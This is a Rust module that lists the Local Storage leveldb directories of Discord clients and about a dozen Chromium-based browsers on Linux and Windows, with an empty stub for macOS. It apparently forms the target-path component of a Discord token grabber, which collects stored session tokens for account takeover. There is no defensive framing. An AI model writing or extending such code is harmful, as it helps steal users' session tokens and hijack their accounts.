extern crate dirs;

#[cfg(target_os = "mac_os")] // Macdonald's users :)
pub fn get() -> Vec<String> {
    vec![]
}

#[cfg(target_os = "linux")] // Linux
pub fn get() -> Vec<String> {
    let config_path = dirs::config_dir().unwrap().display().to_string();

    vec![
        format!("{}/discord", config_path),                    // Discord
        format!("{}/discordcanary", config_path),              // Discord Canary
        format!("{}/discordptb", config_path),                 // Discord PTB
        format!("{}/google-chrome/Default", config_path),      // Google Chrome
        format!("{}/google-chrome-beta/Default", config_path), // Google Chrome Beta
        format!("{}/google-chrome-unstable/Default", config_path), // Google Chrome Dev
        format!("{}/chromium/Default", config_path),           // Chromium
        format!("{}/vivaldi/Default", config_path),            // Vivaldi
        format!("{}/BraveSoftware", config_path),              // Brave
        format!("{}/opera", config_path),                      // Opera
        format!("{}/yandex-browser", config_path),             // Yandex
        format!("{}/yandex-browser-beta", config_path),        // Yandex Beta
    ]
    .iter()
    .map(|p| format!("{}/Local Storage/leveldb", p))
    .collect()
}

#[cfg(target_os = "windows")]
pub fn get() -> Vec<String> {
    let roaming = dirs::config_dir().unwrap().display().to_string();
    let local = dirs::cache_dir().unwrap().display().to_string();

    vec![
        format!("{}\\discord", roaming),                          // Discord
        format!("{}\\discordcanary", roaming),                    // Discord Canary
        format!("{}\\discordptb", roaming),                       // Discord PTB
        format!("{}\\Opera Software\\Opera Stable", roaming),    // Opera
        format!("{}\\Google\\Chrome\\User Data\\Default", local), // Google Chrome
        format!("{}\\Google\\Chrome Beta\\User Data\\Default", local), // Google Chrome Beta
        format!("{}\\Google\\Chrome SxS\\User Data\\Default", local), // Google Chrome Canary
        format!("{}\\Chromium\\User Data\\Default", local),       // Chromium
        format!("{}\\Yandex\\YandexBrowser\\User Data\\Default", local), // Yandex
        format!("{}\\Microsoft\\Edge\\User Data\\Default", local), // Edge
        format!("{}\\Vivaldi\\User Data\\Default", local),        // Vivaldi
        format!("{}\\BraveSoftware\\Brave-Browser\\User Data\\Default", local), // Brave
    ]
    .iter()
    .map(|p| format!("{}\\Local Storage\\leveldb", p))
    .collect()
}
